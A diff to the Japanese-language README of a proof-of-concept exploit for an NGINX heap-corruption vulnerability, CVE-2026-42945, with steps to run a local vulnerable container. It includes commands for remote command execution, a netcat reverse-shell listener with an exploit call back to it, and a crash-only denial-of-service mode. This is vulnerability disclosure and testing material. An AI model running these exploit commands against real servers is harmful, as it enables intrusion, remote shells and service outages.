@@ -26,10 +26,86 @@ Read more about this bug in our [technical write-up](https://depthfirst.com/rese
 
 Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>
 
+## Requirements
+
+- Docker + Docker Compose
+- Python 3
+
 ## Usage
 
 Tested on Ubuntu 24.04.3 LTS.
 
-1. `./setup.sh` — build the container.
-2. `docker compose -f env/docker-compose.yml up` — start the vulnerable NGINX server.
-3. `python3 poc.py --shell` — pop a shell.
+### 1. ビルド（初回のみ）
+
+```bash
+./setup.sh
+```
+
+nginx をソースからコンパイルするため数分かかります。
+
+### 2. 起動
+
+```bash
+./start.sh
+```
+
+脆弱な nginx が `127.0.0.1:19321` で起動します（ASLR 無効）。
+
+### 3. PoC 実行
+
+**コマンド実行モード:**
+
+```bash
+python3 poc.py --cmd 'id > /tmp/pwned'
+```
+
+exploit が成功すると nginx worker が `system()` を実行してクラッシュします。
+コマンドの出力は `env/poc-output/` にマウントされているため、コンテナ停止後も確認できます：
+
+```bash
+cat env/poc-output/pwned
+```
+
+**インタラクティブシェルモード:**
+
+```bash
+# ターミナル1: リバースシェルを待ち受け
+nc -l -p 1337
+
+# ターミナル2: exploit 実行
+python3 poc.py --shell --listen-ip 172.17.0.1 --listen-port 1337
+```
+
+**クラッシュ確認モード（DoS 影響の検証）:**
+
+CVE-2026-42945 は heap corruption により nginx worker を繰り返しクラッシュさせられます。
+パッチ適用前後の DoS 耐性確認には以下を使います：
+
+```bash
+python3 poc.py --cmd 'true'
+```
+
+成功すると worker がクラッシュし、master が再起動するまでの間リクエストが処理されません。
+`--cmd 'true'` は何も副作用がないため、クラッシュそのものだけを確認できます。
+
+### 4. 停止
+
+```bash
+./stop.sh
+```
+
+---
+
+> **注意:** exploit 後に nginx master プロセスも終了してコンテナが停止する場合があります。
+> その場合は `cat env/poc-output/pwned` で RCE を確認してください（`docker compose exec` は使えません）。
+
+## Alternative: Nix + Podman
+
+Docker の代わりに Nix + Podman を使う場合は `nix-setup.sh` を使用します：
+
+```bash
+./nix-setup.sh build   # イメージビルド
+./nix-setup.sh start   # 起動
+./nix-setup.sh poc --cmd 'id > /tmp/pwned'  # exploit
+./nix-setup.sh stop    # 停止
+```
